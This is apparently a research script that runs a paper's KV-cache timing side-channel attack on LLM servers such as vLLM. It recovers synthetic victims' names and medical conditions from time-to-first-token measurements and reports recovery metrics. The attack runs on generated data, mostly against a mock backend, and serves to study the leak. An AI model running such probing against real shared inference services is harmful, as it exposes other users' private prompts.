"""
experiments/run_kv_attack.py
=============================
CANONICAL entry point for the paper KV-cache timing attack pipeline.

Usage
-----
  # Full paper run (requires vLLM server):
  python experiments/run_kv_attack.py --config configs/paper_attack.yaml

  # 3-victim smoke test (mock backend, no GPU):
  python experiments/run_kv_attack.py --config configs/smoke_test.yaml

  # Override config values at CLI:
  python experiments/run_kv_attack.py --config configs/paper_attack.yaml \
      --n-victims 10 --seed 99 --backend mock

Paper pipeline stages:
  1. victim_seeding   — seed n_victims using two_stage_victim_seeder
  2. calibration      — measure miss / s1-hit / full-hit TTFT distributions
  3. stage1_probes    — name elimination (100 candidates × N_REPEATS_STAGE1)
  4. stage2_probes    — condition scan   ( 20 candidates × N_REPEATS_STAGE2)
  5. verification     — confirmation probes (N_REPEATS_CONFIRM)
  6. metrics          — aggregate exact-recovery, ASR, BLQ, query counts

Output (every run, never overwritten):
  experiments/results/<run_id>.json   raw probes + config + env + summary
"""

from __future__ import annotations

import argparse
import datetime
import json
import os
import platform
import random
import subprocess
import sys
import time
import uuid
from pathlib import Path
from typing import Any

_REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_REPO_ROOT / "src"))



def _load_yaml(path: str) -> dict:
    try:
        import yaml
        with open(path) as fh:
            return yaml.safe_load(fh)
    except ImportError:
        import re
        cfg: dict[str, Any] = {}
        current: dict = cfg
        stack: list[tuple[int, dict]] = [(0, cfg)]
        with open(path) as fh:
            for raw in fh:
                line = raw.rstrip()
                stripped = line.lstrip()
                if not stripped or stripped.startswith("#"):
                    continue
                indent = len(line) - len(stripped)
                while len(stack) > 1 and stack[-1][0] >= indent:
                    stack.pop()
                current = stack[-1][1]
                if ":" in stripped:
                    k, _, v = stripped.partition(":")
                    k = k.strip()
                    v = v.strip()
                    if not v or v.startswith("#"):
                        new_dict: dict = {}
                        current[k] = new_dict
                        stack.append((indent + 2, new_dict))
                    else:
                        v = v.split("#")[0].strip()
                        if v.lower() == "true":
                            current[k] = True
                        elif v.lower() == "false":
                            current[k] = False
                        else:
                            try:
                                current[k] = int(v)
                            except ValueError:
                                try:
                                    current[k] = float(v)
                                except ValueError:
                                    current[k] = v.strip('"\'')
        return cfg



def _parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Canonical paper KV-cache attack entry point",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    p.add_argument("--config",    required=True, help="YAML config file")
    p.add_argument("--n-victims", type=int,      help="Override victims.n_victims")
    p.add_argument("--seed",      type=int,      help="Override victims.seed")
    p.add_argument("--backend",   choices=["vllm", "tgi", "mock"],
                   help="Override backend.name")
    p.add_argument("--output-dir", help="Override output.dir")
    p.add_argument("--dry-run",   action="store_true",
                   help="Validate config and exit without running attack")
    return p.parse_args()



def _merge_overrides(cfg: dict, args: argparse.Namespace) -> dict:
    if args.n_victims is not None:
        cfg.setdefault("victims", {})["n_victims"] = args.n_victims
    if args.seed is not None:
        cfg.setdefault("victims", {})["seed"] = args.seed
    if args.backend is not None:
        cfg.setdefault("backend", {})["name"] = args.backend
    if args.output_dir is not None:
        cfg.setdefault("output", {})["dir"] = args.output_dir
    return cfg



def _capture_env(cfg: dict) -> dict:
    env: dict[str, Any] = {
        "python_version": sys.version,
        "platform": platform.platform(),
        "cwd": os.getcwd(),
        "timestamp_utc": datetime.datetime.utcnow().isoformat() + "Z",
    }
    for pkg in ("openai", "transformers", "numpy", "scipy", "torch"):
        try:
            import importlib
            m = importlib.import_module(pkg)
            env[f"{pkg}_version"] = getattr(m, "__version__", "unknown")
        except ImportError:
            env[f"{pkg}_version"] = "not_installed"
    try:
        env["git_commit"] = subprocess.check_output(
            ["git", "rev-parse", "HEAD"], stderr=subprocess.DEVNULL
        ).decode().strip()
    except Exception:
        env["git_commit"] = "unavailable"
    env["command"] = " ".join(sys.argv)
    env["backend_name"] = cfg.get("backend", {}).get("name", "unknown")
    env["model_id"] = cfg.get("backend", {}).get("model_id", "unknown")
    return env



def _generate_victims(cfg: dict) -> list[dict]:
    from kv_attack import FIRST_NAMES, LAST_NAMES, MEDICAL_CONDITIONS

    vcfg  = cfg.get("victims", {})
    seed  = vcfg.get("seed", 42)
    n     = vcfg.get("n_victims", 5)
    rng   = random.Random(seed)

    from datetime import date, timedelta

    def _dob(r: random.Random) -> str:
        start = date(1935, 1, 1)
        delta = (date(2006, 12, 31) - start).days
        return (start + timedelta(days=r.randint(0, delta))).isoformat()

    victims = []
    for i in range(n):
        fn   = rng.choice(FIRST_NAMES)
        ln   = rng.choice(LAST_NAMES)
        cond = rng.choice(MEDICAL_CONDITIONS)
        victims.append({
            "victim_id" : i,
            "name"      : f"{fn} {ln}",
            "dob"       : _dob(rng),
            "condition" : cond,
        })
    return victims



def _build_backend(cfg: dict):
    from kv_attack.backends import get_backend

    bcfg = cfg.get("backend", {})
    name = bcfg.get("name", "mock")

    if name == "vllm":
        return get_backend(
            "vllm",
            base_url = bcfg.get("base_url", "http://localhost:8001/v1"),
            model_id = bcfg.get("model_id", "deepseek-ai/DeepSeek-R1-Distill-Llama-8B"),
        )
    elif name == "tgi":
        return get_backend(
            "tgi",
            base_url = bcfg.get("base_url", "http://localhost:8080"),
            model_id = bcfg.get("model_id", "deepseek-ai/DeepSeek-R1-Distill-Llama-8B"),
        )
    elif name == "mock":
        from kv_attack.backends.two_stage_mock_backend import TwoStageMockBackend
        return TwoStageMockBackend(
            hit_ttft_ms    = bcfg.get("mock_hit_ttft_ms",    87.6),
            s1_hit_ttft_ms = bcfg.get("mock_s1_hit_ttft_ms", 264.0),
            miss_ttft_ms   = bcfg.get("mock_miss_ttft_ms",   576.1),
            noise_std_ms   = bcfg.get("mock_noise_std_ms",     4.7),
        )
    else:
        raise ValueError(f"Unknown backend: {name!r}")



def _run_mock_attack(cfg: dict, victims: list[dict], backend) -> list[dict]:
    """
    Lightweight attack loop for mock-backend smoke tests.

    For real vLLM runs use week13_harness.py (invoked below).
    This path exercises the full result-schema so downstream metrics
    scripts work identically for smoke and paper runs.
    """
    import numpy as np
    from kv_attack import (
        FIRST_NAMES, LAST_NAMES, MEDICAL_CONDITIONS,
        N_REPEATS_STAGE1, N_REPEATS_FAST, N_REPEATS_CONFIRM,
    )

    pcfg = cfg.get("probes", {})
    n_r1 = pcfg.get("n_repeats_stage1", N_REPEATS_STAGE1)
    n_r2 = pcfg.get("n_repeats_stage2", N_REPEATS_FAST)
    n_rc = pcfg.get("n_repeats_confirm", N_REPEATS_CONFIRM)

    tcfg = cfg.get("thresholds", {})
    t1   = tcfg.get("t1_ms", 438.8)
    t2   = tcfg.get("t2_ms", 177.1)

    seed = cfg.get("victims", {}).get("seed", 42)
    rng  = random.Random(seed + 9999)

    names      = [f"{fn} {ln}" for fn in FIRST_NAMES for ln in LAST_NAMES]
    conditions = MEDICAL_CONDITIONS[:]

    results = []

    for v in victims:
        if hasattr(backend, "seed_victim"):
            backend.seed_victim(v["victim_id"], v["name"], v["condition"])

        probes: list[dict] = []
        stage1_calls = 0
        stage2_calls = 0

        found_name: str | None = None
        for pi, cand_name in enumerate(names):
            ttfts = []
            for _ in range(n_r1):
                prompt = (
                    f"||VICTIM::{v['victim_id']}||"
                    f"||NAME_SENTINEL::{cand_name}||"
                    "||COND_SENTINEL::__DUMMY__||"
                )
                ttfts.append(backend.measure_ttft(prompt))
                stage1_calls += 1

            mean_ttft = float(np.mean(ttfts))
            is_s1_hit = mean_ttft < t1
            probes.append({
                "stage": 1, "probe_idx": pi,
                "candidate": cand_name, "truth": v["name"],
                "mean_ttft_ms": round(mean_ttft, 3),
                "predicted_cache_state": "S1_HIT" if is_s1_hit else "MISS",
            })
            if is_s1_hit:
                found_name = cand_name
                break

        found_cond: str | None = None
        if found_name is not None:
            for pi, cand_cond in enumerate(conditions):
                ttfts = []
                for _ in range(n_r2):
                    prompt = (
                        f"||VICTIM::{v['victim_id']}||"
                        f"||NAME_SENTINEL::{found_name}||"
                        f"||COND_SENTINEL::{cand_cond}||"
                    )
                    ttfts.append(backend.measure_ttft(prompt))
                    stage2_calls += 1

                mean_ttft = float(np.mean(ttfts))
                is_s2_hit = mean_ttft < t2
                probes.append({
                    "stage": 2, "probe_idx": pi,
                    "candidate": cand_cond, "truth": v["condition"],
                    "mean_ttft_ms": round(mean_ttft, 3),
                    "predicted_cache_state": "FULL_HIT" if is_s2_hit else "S1_HIT",
                })
                if is_s2_hit:
                    found_cond = cand_cond
                    break

        confirm_calls = 0
        if found_name and found_cond:
            for _ in range(n_rc):
                prompt = (
                    f"||VICTIM::{v['victim_id']}||"
                    f"||NAME_SENTINEL::{found_name}||"
                    f"||COND_SENTINEL::{found_cond}||"
                )
                backend.measure_ttft(prompt)
                confirm_calls += 1

        total_calls = stage1_calls + stage2_calls + confirm_calls
        exact = (found_name == v["name"]) and (found_cond == v["condition"])
        trr   = (1.0 if found_name == v["name"] else 0.0) * 0.5 + \
                (1.0 if found_cond == v["condition"] else 0.0) * 0.5

        results.append({
            "victim_id"       : v["victim_id"],
            "ground_truth"    : {"name": v["name"], "condition": v["condition"], "dob": v["dob"]},
            "recovered"       : {"name": found_name, "condition": found_cond},
            "exact_match"     : exact,
            "token_recovery_rate": trr,
            "confirmed_hit"   : exact,
            "total_api_calls" : total_calls,
            "stage1_api_calls": stage1_calls,
            "stage2_api_calls": stage2_calls,
            "t1_threshold_ms" : t1,
            "t2_threshold_ms" : t2,
            "probes"          : probes,
        })

        if hasattr(backend, "clear_victim"):
            backend.clear_victim(v["victim_id"])

    return results



def _aggregate(results: list[dict]) -> dict:
    import numpy as np

    n = len(results)
    exact_recoveries = [r["exact_match"] for r in results]
    trrs = [r.get("token_recovery_rate", float(r["exact_match"])) for r in results]
    calls = [r["total_api_calls"] for r in results]
    s1c   = [r.get("stage1_api_calls", 0) for r in results]
    s2c   = [r.get("stage2_api_calls", 0) for r in results]

    H0 = 10.9658
    BLQ_LINEAR = 0.014383

    mean_calls = float(np.mean(calls)) if calls else 0.0
    blq_emp    = H0 / max(mean_calls, 1.0)

    return {
        "n_victims"               : n,
        "exact_recovery_count"    : int(sum(exact_recoveries)),
        "exact_recovery_rate"     : float(sum(exact_recoveries)) / n,
        "asr"                     : float(sum(exact_recoveries)) / n,
        "mean_trr"                : float(np.mean(trrs)),
        "mean_total_api_calls"    : round(mean_calls, 2),
        "median_total_api_calls"  : float(np.median(calls)),
        "p95_total_api_calls"     : float(np.percentile(calls, 95)),
        "mean_stage1_api_calls"   : round(float(np.mean(s1c)), 2),
        "mean_stage2_api_calls"   : round(float(np.mean(s2c)), 2),
        "prior_entropy_bits"      : H0,
        "blq_empirical"           : round(blq_emp, 6),
        "blq_linear_week12"       : BLQ_LINEAR,
        "blq_improvement_factor"  : round(blq_emp / BLQ_LINEAR, 4),
        "blq_theoretical_adaptive": 0.138457,
        "e_q_theoretical"         : 79.2,
        "q_max_theoretical"       : 153,
    }



def _write_output(
    cfg       : dict,
    env       : dict,
    victims   : list[dict],
    results   : list[dict],
    aggregate : dict,
    run_id    : str,
) -> Path:
    import json

    out_cfg  = cfg.get("output", {})
    out_dir  = Path(out_cfg.get("dir", "experiments/results"))
    out_dir.mkdir(parents=True, exist_ok=True)
    out_path = out_dir / f"{run_id}.json"

    payload: dict[str, Any] = {
        "run_id"      : run_id,
        "algorithm"   : cfg.get("run", {}).get("algorithm", "two_stage_adaptive"),
        "config"      : cfg if out_cfg.get("save_config", True) else None,
        "environment" : env if out_cfg.get("save_environment", True) else None,
        "model"       : env.get("model_id", "unknown"),
        "backend"     : env.get("backend_name", "unknown"),
        "n_victims"   : len(victims),
        "seed"        : cfg.get("victims", {}).get("seed", 42),
        "aggregate"   : aggregate,
        "results"     : results if out_cfg.get("save_raw_probes", True) else [
            {k: v for k, v in r.items() if k != "probes"} for r in results
        ],
    }

    class _NpEncoder(json.JSONEncoder):
        def default(self, obj):
            import numpy as np
            if isinstance(obj, (np.integer,)):  return int(obj)
            if isinstance(obj, (np.floating,)): return float(obj)
            if isinstance(obj, np.ndarray):     return obj.tolist()
            if isinstance(obj, np.bool_):       return bool(obj)
            return super().default(obj)

    with open(out_path, "w") as fh:
        json.dump(payload, fh, indent=2, cls=_NpEncoder)

    return out_path



def main() -> None:
    args = _parse_args()

    cfg = _load_yaml(args.config)
    cfg = _merge_overrides(cfg, args)

    run_id = (
        cfg.get("run", {}).get("id_prefix", "kvcache")
        + f"-{datetime.date.today().isoformat()}"
        + f"-{uuid.uuid4().hex[:8]}"
    )

    print("\n" + "=" * 70)
    print(f"  KV-Cache Timing Attack — Canonical Paper Pipeline")
    print(f"  Run ID  : {run_id}")
    print(f"  Config  : {args.config}")
    print(f"  Backend : {cfg.get('backend', {}).get('name', '?')}")
    print(f"  Victims : {cfg.get('victims', {}).get('n_victims', '?')}")
    print(f"  Seed    : {cfg.get('victims', {}).get('seed', '?')}")
    print("=" * 70 + "\n")

    env     = _capture_env(cfg)
    victims = _generate_victims(cfg)

    print(f"[pipeline] Generated {len(victims)} victims (seed={cfg['victims']['seed']})")
    for v in victims[:3]:
        print(f"  victim {v['victim_id']}: {v['name']} | {v['condition']}")
    if len(victims) > 3:
        print(f"  ... ({len(victims) - 3} more)")

    if args.dry_run:
        print("\n[pipeline] --dry-run: config validated, exiting without attack.")
        return

    backend = _build_backend(cfg)
    binfo   = backend.get_info()
    print(f"\n[pipeline] Backend ready: {binfo.backend_name} / {binfo.model_id}")

    if cfg["backend"]["name"] == "vllm":
        print("[pipeline] Delegating to week13_harness for vLLM run…")
        from kv_attack.week13_harness import main as w13_main
        out_dir = cfg.get("output", {}).get("dir", "experiments/results")
        cmd = [
            sys.executable, "-m", "kv_attack.week13_harness",
            "--backend", "vllm",
            "--base-url", cfg["backend"].get("base_url", "http://localhost:8001/v1"),
            "--model-id", cfg["backend"].get("model_id", "deepseek-ai/DeepSeek-R1-Distill-Llama-8B"),
            "--n-victims", str(cfg["victims"]["n_victims"]),
            "--n-calib",   str(cfg.get("calibration", {}).get("n_samples", 200)),
            "--seed",      str(cfg["victims"]["seed"]),
            "--output",    f"{out_dir}/{run_id}.json",
        ]
        print(f"[pipeline] Running: {' '.join(cmd)}\n")
        os.chdir(_REPO_ROOT / "src")
        ret = subprocess.run(cmd)
        sys.exit(ret.returncode)

    t0      = time.time()
    results = _run_mock_attack(cfg, victims, backend)
    elapsed = time.time() - t0

    aggregate = _aggregate(results)
    print(f"\n[pipeline] Attack complete in {elapsed:.1f}s")
    print(f"  Exact recovery : {aggregate['exact_recovery_count']}/{aggregate['n_victims']}"
          f" ({aggregate['exact_recovery_rate']*100:.1f} %)")
    print(f"  Mean queries   : {aggregate['mean_total_api_calls']:.1f}")
    print(f"  BLQ empirical  : {aggregate['blq_empirical']:.5f} bits/query")
    print(f"  BLQ improvement: {aggregate['blq_improvement_factor']:.2f}× vs linear")

    out_path = _write_output(cfg, env, victims, results, aggregate, run_id)
    print(f"\n[pipeline] Results saved → {out_path}")
    print("=" * 70 + "\n")


if __name__ == "__main__":
    main()
